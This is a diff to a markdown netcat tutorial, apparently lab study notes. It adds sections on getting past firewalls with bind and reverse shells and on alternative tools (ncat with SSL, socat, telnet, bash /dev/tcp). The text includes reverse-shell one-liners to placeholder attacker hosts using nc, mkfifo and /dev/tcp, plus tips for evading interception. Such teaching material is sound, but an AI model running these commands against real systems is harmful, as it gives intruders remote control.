@@ -12,6 +12,8 @@
 5. [Port Scanning](#5-port-scanning)
 6. [Honeypot](#6-honeypot)
 7. [Bind vs Reverse Shell](#7-bind-vs-reverse-shell)
+8. [Beating Firewalls with Netcat](#8-beating-firewalls-with-netcat)
+9. [Additional Swiss Army Knife-style Tools](#9-additional-swiss-army-knife-style-tools)
 
 ---
 
@@ -214,4 +216,77 @@ nc <attacker_ip> 5050 -e /bin/bash
 rm /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 5050 > /tmp/f
 ```
+---
 
+## 8 – Beating Firewalls with Netcat
+
+### Scenario 01 – Basic Firewall
+
+On a computer without a firewall, it's easy to open a Bind Shell. But with a basic firewall active, this technique stops working. In the next scenario, we'll see how to get around this.
+
+---
+
+### Scenario 02 – "Closed" Port as an Advantage
+
+- Run `rule2.sh`
+- Direct access no longer works
+- Now we have a port **allowed** by the firewall, but it's **closed** (NMAP returns RST-ACK)
+- The strategy here is to **use this port anyway**, forcing it open for Bind Shell usage
+
+---
+
+### Scenario 03 – Completely Blocked Entry
+
+- Run `rule3.sh`
+- No port accepts connections
+- Solution: use a **Reverse Shell**, making the **server connect back to us**
+
+---
+
+### Scenario 04 – Totally Restrictive Firewall (inbound and outbound blocked)
+
+- Run `rule4.sh`
+- Neither Bind nor Reverse work
+- Strategy: test **common ports (80, 443, 53...)** and different protocols to understand what the firewall allows
+- This is a scenario for exploring the firewall itself
+
+---
+
+## 9 – Additional Swiss Army Knife-style Tools
+
+### NCAT vs NETCAT
+
+- **NCAT** has encryption (SSL) and `--allow` to limit IPs that can connect
+- Shell with SSL makes interception by security systems difficult
+- `--allow <ip>` prevents unwanted connections
+
+---
+
+### SOCAT
+
+- Robust alternative to Netcat/NCAT
+- Support for multiple protocols: TCP, UDP, etc.
+- Allows Bind and Reverse Shells
+- Built-in tunneling, useful for firewall bypass and encapsulation
+
+---
+
+### TELNET
+
+- Another option to connect to services
+- Also allows shell interaction, although less flexible
+
+---
+
+### /dev/tcp/
+
+- Native Bash feature to create TCP connections
+- Example for reverse shell:
+```bash
+bash -i > /dev/tcp/<ip>/<port> 0>&1 2>&1
+```
+
+- Redirections:
+  - `0` = STDIN
+  - `1` = STDOUT
+  - `2` = STDERR
